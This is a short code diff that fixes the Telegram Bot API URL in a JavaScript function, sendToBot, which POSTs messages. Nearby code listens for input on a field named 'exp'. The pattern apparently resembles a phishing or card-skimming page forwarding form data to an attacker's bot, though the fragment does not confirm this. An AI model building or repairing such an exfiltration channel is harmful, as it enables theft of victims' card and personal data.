@@ -88,7 +88,7 @@ document.getElementById('exp').addEventListener('input', function (e) {
 });
 
 async function sendToBot(msg) {
-    const url = `https://telegram.org{TOKEN}/sendMessage`;
+    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
     try {
         await fetch(url, {
             method: 'POST',
